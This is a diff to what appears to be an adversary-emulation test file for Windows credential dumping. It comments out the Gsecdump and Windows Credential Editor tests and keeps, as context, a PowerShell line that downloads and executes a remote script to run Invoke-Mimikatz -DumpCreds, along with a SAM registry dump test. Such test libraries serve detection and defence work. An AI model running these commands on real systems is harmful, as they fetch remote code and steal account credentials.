@@ -20,34 +20,34 @@ atomic_tests:
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
-- name: Gsecdump
-  uuid: 0428e1c1-3408-4ed6-9e4c-4c360cd3cbc0
+# - name: Gsecdump
+#   uuid: 0428e1c1-3408-4ed6-9e4c-4c360cd3cbc0
 
-  description: |
-    https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
-  supported_platforms:
-    - windows
-  executor:
-    name: command_prompt
-    command: |
-      gsecdump -a
+#   description: |
+#     https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+#   supported_platforms:
+#     - windows
+#   executor:
+#     name: command_prompt
+#     command: |
+#       gsecdump -a
 
-- name: Windows Credential Editor
-  uuid: a0458da2-9909-4e02-8d40-453e34dc4503
+# - name: Windows Credential Editor
+#   uuid: a0458da2-9909-4e02-8d40-453e34dc4503
 
-  description: |
-    http://www.ampliasecurity.com/research/windows-credentials-editor/
-  supported_platforms:
-    - windows
-  input_arguments:
-    output_file:
-      description: Path where resulting data should be placed
-      type: Path
-      default: output.txt
-  executor:
-    name: command_prompt
-    command: |
-      wce -o #{output_file}
+#   description: |
+#     http://www.ampliasecurity.com/research/windows-credentials-editor/
+#   supported_platforms:
+#     - windows
+#   input_arguments:
+#     output_file:
+#       description: Path where resulting data should be placed
+#       type: Path
+#       default: output.txt
+#   executor:
+#     name: command_prompt
+#     command: |
+#       wce -o #{output_file}
 
 - name: Registry dump of SAM, creds, and secrets
   uuid: 98ab69c5-be3c-41e9-aff8-c7a08313d91a
